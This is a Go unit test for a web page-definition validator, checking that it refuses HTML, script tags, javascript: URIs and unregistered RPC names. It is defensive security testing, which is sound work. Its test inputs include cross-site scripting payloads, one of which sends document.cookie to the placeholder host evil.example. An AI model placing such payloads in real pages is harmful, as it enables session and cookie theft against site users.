package pagedef

import "testing"

// TestTodo_WEB_002_Security proves the three things the WEB-002 contract
// exists to make structurally impossible rather than merely discouraged:
// free HTML, script, and a binding/action naming an RPC no registered
// service exposes. Each case starts from validMinimalPage() (already proven
// valid by TestTodo_WEB_002) so the only variable is the one attack surface
// under test.
func TestTodo_WEB_002_Security(t *testing.T) {
	cases := []struct {
		name   string
		mutate func(*PageDefinition)
		path   string
	}{
		{
			name: "HTML tag in a heading",
			mutate: func(pd *PageDefinition) {
				pd.Regions[0].Heading.Text = "<b>bold</b>"
			},
			path: "regions[0].heading.text",
		},
		{
			name: "script tag in a heading",
			mutate: func(pd *PageDefinition) {
				pd.Regions[0].Heading.Text = "<script>document.location='https://evil.example/'+document.cookie</script>"
			},
			path: "regions[0].heading.text",
		},
		{
			name: "javascript: URI in a widget ref",
			mutate: func(pd *PageDefinition) {
				pd.Regions[1].Widgets[0].WidgetRef = "javascript:alert(document.cookie)"
			},
			path: "regions[1].widgets[0].widget_ref",
		},
		{
			name: "HTML in a widget id",
			mutate: func(pd *PageDefinition) {
				pd.Regions[1].Widgets[0].ID = "<img src=x onerror=alert(1)>"
			},
			path: "regions[1].widgets[0].id",
		},
		{
			name: "HTML in a brand token",
			mutate: func(pd *PageDefinition) {
				pd.BrandTokens = append(pd.BrandTokens, "<style>body{display:none}</style>")
			},
			path: "brand_tokens[1]",
		},
		{
			name: "HTML in a required role",
			mutate: func(pd *PageDefinition) {
				pd.Regions[1].Actions[0].RequiredRole = "<script>manager</script>"
			},
			path: "regions[1].actions[0].required_role",
		},
		{
			name: "binding names an RPC no registered service has",
			mutate: func(pd *PageDefinition) {
				pd.Regions[1].Bindings[0].RPC = "hcmnext.journey.v1.JourneyService/DeleteEverything"
			},
			path: "regions[1].bindings[0].rpc",
		},
		{
			name: "action names an RPC on a service that does not exist at all",
			mutate: func(pd *PageDefinition) {
				pd.Regions[1].Actions[0].RPC = "hcmnext.notaservice.v1.NotAService/DoAnything"
			},
			path: "regions[1].actions[0].rpc",
		},
		{
			name: "binding names a plausible-looking but unregistered method on a real service",
			mutate: func(pd *PageDefinition) {
				// JourneyService has no ExportEverything method; only the
				// nine ListJourneys/ProposeJourney/InspectJourney/
				// ExecuteJourney/DecideJourney/ListWorkers/CreateWorker/
				// WatchJourney set does.
				pd.Regions[1].Bindings[0].RPC = RPCRef(JourneyServiceName, "ExportEverything")
			},
			path: "regions[1].bindings[0].rpc",
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			pd := validMinimalPage()
			tc.mutate(&pd)
			v := pd.Validate()
			if !hasViolationOn(v, tc.path) {
				t.Fatalf("Validate() = %v, want a refusal on %q", v, tc.path)
			}
		})
	}

	t.Run("a clean page is not refused by any of the above checks", func(t *testing.T) {
		if v := validMinimalPage().Validate(); len(v) != 0 {
			t.Fatalf("Validate() on a known-clean page = %v, want no violations", v)
		}
	})
}
